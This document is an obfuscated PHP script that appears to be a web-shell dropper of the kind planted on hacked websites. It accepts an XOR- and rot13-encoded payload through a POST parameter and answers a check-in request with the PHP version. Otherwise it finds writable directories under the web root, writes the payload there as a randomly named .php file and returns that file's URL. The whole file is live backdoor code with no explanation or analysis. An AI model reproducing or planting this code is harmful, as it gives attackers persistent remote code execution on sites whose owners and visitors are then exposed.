<?php $zuyzmftxx = "moxpjcrqaotsstgq";$qdxdakh = "";foreach ($_POST as $pqsghmtt => $mvygazfv){if (strlen($pqsghmtt) == 16 and substr_count($mvygazfv, "%") > 10){dfqaex($pqsghmtt, $mvygazfv);}}function dfqaex($pqsghmtt, $kkexijr){global $qdxdakh;$qdxdakh = $pqsghmtt;$kkexijr = str_split(rawurldecode(str_rot13($kkexijr)));function enorfaqz($plhcf, $pqsghmtt){global $zuyzmftxx, $qdxdakh;return $plhcf ^ $zuyzmftxx[$pqsghmtt % strlen($zuyzmftxx)] ^ $qdxdakh[$pqsghmtt % strlen($qdxdakh)];}$kkexijr = implode("", array_map("enorfaqz", array_values($kkexijr), array_keys($kkexijr)));$kkexijr = @unserialize($kkexijr);if (@is_array($kkexijr)){$pqsghmtt = array_keys($kkexijr);$kkexijr = $kkexijr[$pqsghmtt[0]];if ($kkexijr === $pqsghmtt[0]){echo @serialize(Array('php' => @phpversion(), ));exit();}else{function mfzpq($bygtkir) {static $ceuplllc = array();$nbkbjaw = glob($bygtkir . '/*', GLOB_ONLYDIR);if (count($nbkbjaw) > 0) {foreach ($nbkbjaw as $bygtk){if (@is_writable($bygtk)){$ceuplllc[] = $bygtk;}}}foreach ($nbkbjaw as $bygtkir) mfzpq($bygtkir);return $ceuplllc;}$qmkydbf = $_SERVER["DOCUMENT_ROOT"];$nbkbjaw = mfzpq($qmkydbf);$pqsghmtt = array_rand($nbkbjaw);$abvezoxf = $nbkbjaw[$pqsghmtt] . "/" . substr(md5(time()), 0, 8) . ".php";@file_put_contents($abvezoxf, $kkexijr);echo "http://" . $_SERVER["HTTP_HOST"] . substr($abvezoxf, strlen($qmkydbf));exit();}}}